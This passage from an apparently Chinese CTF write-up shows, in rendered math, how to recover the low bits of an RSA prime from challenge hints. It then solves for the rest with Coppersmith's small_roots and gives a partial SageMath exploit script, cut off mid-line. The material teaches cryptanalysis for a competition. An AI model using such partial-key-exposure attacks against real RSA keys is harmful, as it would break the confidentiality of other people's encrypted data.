style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span><span class="mord mtight">5</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span><span class="mord mtight">5</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span><span style="top:-3.0171194999999975em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">展</span><span class="mord cjk_fallback">开</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">到</span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">下</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">子</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span></span><span style="top:-1.8171194999999976em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span><span class="mord mtight">3</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span><span class="mord mtight">5</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span><span class="mord mtight">5</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-0.6171194999999983em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">将</span><span class="mord mathnormal">n</span><span class="mord cjk_fallback">模</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span><span class="mord mtight">5</span></span></span></span></span></span></span></span></span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">会</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">到</span></span></span><span style="top:0.582880500000001em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span><span class="mord mtight">5</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span><span style="top:1.7828805000000003em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">此</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">已</span><span class="mord cjk_fallback">知</span><span class="mord mathnormal">n</span><span class="mord cjk_fallback">和</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">计</span><span class="mord cjk_fallback">算</span><span class="mord cjk_fallback">出</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">没</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">问</span><span class="mord cjk_fallback">题</span></span></span><span style="top:2.9971194999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.854239em;"><span style="top:-2.3986920000000005em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span><span style="top:-3.1031310000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3013079999999999em;"><span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span><span class="mord mtight">5</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:6.3571195em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></span></p><ul><li>计算出<code>p</code>的低<code>256</code>位之后，我们就可以列方程了</li></ul><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.15999999999999992em" columnalign="left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>p</mi><mtext>的剩余为使用</mtext><mi>x</mi><mtext>表示</mtext><mo separator="true">,</mo><mtext>则</mtext><mi>p</mi><mtext>可以列出方程</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>p</mi><mo>=</mo><msub><mi>p</mi><mrow><mi>h</mi><mi>i</mi><mi>g</mi><mi>h</mi></mrow></msub><mo>∗</mo><msup><mn>2</mn><mn>724</mn></msup><mo>+</mo><mi>x</mi><mo>∗</mo><msup><mn>2</mn><mn>265</mn></msup><mo>+</mo><msub><mi>p</mi><mrow><mi>l</mi><mi>o</mi><mi>w</mi></mrow></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>在然后我们大致确定一下</mtext><mi>x</mi><mtext>的位数</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>1024</mn><mo>−</mo><mn>300</mn><mo>−</mo><mn>265</mn><mo>=</mo><mn>459</mn></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{l}p的剩余为使用x表示,则p可以列出方程\\p = p_{high}*2^{724}+x*2^{265}+p_{low}\\在然后我们大致确定一下x的位数\\1024-300-265=459\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:4.800000000000001em;vertical-align:-2.1500000000000004em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.6500000000000004em;"><span style="top:-4.8100000000000005em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">剩</span><span class="mord cjk_fallback">余</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">使</span><span class="mord cjk_fallback">用</span><span class="mord mathnormal">x</span><span class="mord cjk_fallback">表</span><span class="mord cjk_fallback">示</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">则</span><span class="mord mathnormal">p</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">列</span><span class="mord cjk_fallback">出</span><span class="mord cjk_fallback">方</span><span class="mord cjk_fallback">程</span></span></span><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361079999999999em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">h</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span><span class="mord mathnormal mtight">h</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span><span class="mord mtight">2</span><span class="mord mtight">4</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span><span class="mord mtight">5</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">然</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">大</span><span class="mord cjk_fallback">致</span><span class="mord cjk_fallback">确</span><span class="mord cjk_fallback">定</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">下</span><span class="mord mathnormal">x</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">位</span><span class="mord cjk_fallback">数</span></span></span><span style="top:-1.2099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mord">0</span><span class="mord">2</span><span class="mord">4</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">3</span><span class="mord">0</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">2</span><span class="mord">6</span><span class="mord">5</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">4</span><span class="mord">5</span><span class="mord">9</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.1500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></span></p><ul><li>此时我们就可以使用coppersmith进行求解，但是如果对这个方程直接用<code>small_roots</code>求解，是解不出来的，这时我们对<code>2**265位--2**271位进行爆破</code>。同时让<code>small_roots()传入的X参数为459-6</code>，传入的<code>beta值在0.44--0.38</code>之间才能求解出正确答案</li><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">hint1 = <span class="number">1514296530850131082973956029074258536069144071110652176122006763622293335057110441067910479</span></span><br><span class="line">hint2 = <span class="number">40812438243894343296354573724131194431453023461572200856406939246297219541329623</span></span><br><span class="line">n = <span class="number">21815431662065695412834116602474344081782093119269423403335882867255834302242945742413692949886248581138784199165404321893594820375775454774521554409598568793217997859258282700084148322905405227238617443766062207618899209593375881728671746850745598576485323702483634599597393910908142659231071532803602701147251570567032402848145462183405098097523810358199597631612616833723150146418889589492395974359466777040500971885443881359700735149623177757865032984744576285054725506299888069904106805731600019058631951255795316571242969336763938805465676269140733371287244624066632153110685509892188900004952700111937292221969</span></span><br><span class="line">ct = <span class="number">19073695285772829730103928222962723784199491145730661021332365516942301513989932980896145664842527253998170902799883262567366661277268801440634319694884564820420852947935710798269700777126717746701065483129644585829522353341718916661536894041337878440111845645200627940640539279744348235772441988748977191513786620459922039153862250137904894008551515928486867493608757307981955335488977402307933930592035163126858060189156114410872337004784951228340994743202032248681976932591575016798640429231399974090325134545852080425047146251781339862753527319093938929691759486362536986249207187765947926921267520150073408188188</span></span><br><span class="line">h_low = (n * inverse_mod(hint2,<span class="number">2</span>^<span class="number">265</span>)) % <span class="number">2</span>^<span class="number">265</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">    p = hint1*(<span class="number">2</span>^<span class="number">724</span>) + x*(<span class="number">2</span>^<span class="number">265</span>)*<span class="number">64</span> + i*(<span class="number">2</span>^<span class="number">265</span>) +h_low</span><br><span class="line">    p = p.monic()</span><br><span class="line">    out = p.small_roots(X=<span class="number">2</span>^<span class="number">453</span>,beta = <span class="number">0.44</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(out) != <span class="number">0</span> :</span><br><span class="line">        <span class="built_in">print</span>(out[<span class="number">0</span>])</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">p 